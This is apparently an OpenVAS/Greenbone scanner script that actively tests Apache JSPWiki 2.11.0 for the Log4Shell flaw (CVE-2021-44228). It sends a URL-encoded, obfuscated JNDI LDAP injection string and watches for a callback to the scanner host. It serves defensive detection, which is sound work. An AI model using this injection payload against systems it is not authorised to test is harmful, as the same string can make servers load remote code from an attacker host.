# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:apache:jspwiki";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.147359");
  script_version("2021-12-22T07:48:11+0000");
  script_tag(name:"last_modification", value:"2021-12-22 11:14:08 +0000 (Wed, 22 Dec 2021)");
  script_tag(name:"creation_date", value:"2021-12-20 07:29:51 +0000 (Mon, 20 Dec 2021)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-12-14 01:15:00 +0000 (Tue, 14 Dec 2021)");

  script_cve_id("CVE-2021-44228");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Apache JSPWiki 2.11.0 Log4j RCE Vulnerability (Log4Shell) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_jspwiki_http_detect.nasl");
  script_mandatory_keys("apache/jspwiki/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Apache JSPWiki is prone to a remote code execution (RCE)
  vulnerability in the Apache Log4j library dubbed 'Log4Shell'.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Apache Log4j2 JNDI features used in configuration, log messages,
  and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.
  An attacker who can control log messages or log message parameters can execute arbitrary code
  loaded from LDAP servers when message lookup substitution is enabled.");

  script_tag(name:"affected", value:"Apache JSPWiki version 2.11.0.");

  script_tag(name:"solution", value:"Update to version 2.11.1 or later.");

  script_xref(name:"URL", value:"https://jspwiki-wiki.apache.org/Wiki.jsp?page=Log4J-CVE-2021-44228");
  script_xref(name:"URL", value:"https://github.com/advisories/GHSA-jfh8-c2jp-5v3q");
  script_xref(name:"URL", value:"https://www.openwall.com/lists/oss-security/2021/12/10/1");
  script_xref(name:"URL", value:"https://www.lunasec.io/docs/blog/log4j-zero-day/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("pcap_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

ownip = this_host();
targetip = get_host_ip();
rnd_port = rand_int_range(min: 10000, max: 32000);
src_filter = pcap_src_ip_filter_from_hostnames();

url = dir + "/wiki/$%7Bjndi:ldap:$%7B::-/%7D/" + ownip + ":" + rnd_port + "/a%7D/";

req = http_get(port: port, item: url);

soc = open_sock_tcp(port);
if (!soc)
  exit(0);

filter = string("tcp and dst port ", rnd_port, " and ", src_filter, " and dst host ", ownip);

res = send_capture(socket: soc, data: req, timeout: 10, pcap_filter: filter);
close(soc);

if (res) {
  info['HTTP Method'] = "GET";
  info['Affected URL'] = http_report_vuln_url(port: port, url: url, url_only: TRUE);

  # nb: We need to call the correct get_ip_*element() function below depending on the IP version
  # of the received IP packet.
  ip_vers_hex = hexstr(res[0]);
  if (ip_vers_hex[0] == 4)
    ip = get_ip_element(ip: res, element: "ip_src");
  else if (ip_vers_hex[0] == 6)
    ip = get_ipv6_element(ipv6: res, element: "ip6_src");

  if (!ip)
    ip = "N/A";

  report  = 'By doing a HTTP request with the following data (excerpt):\n\n';
  report += text_format_table(array: info) + '\n\n';
  report += 'it was possible to trigger the vulnerability and make the remote host sending a request back to the scanner host (Details on the received packet follows).\n\n';
  report += "Destination port: " + rnd_port + '/tcp (receiving port on scanner host side)\n';
  report += "Originating IP:  " + ip + " (originating IP from target host side)";
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
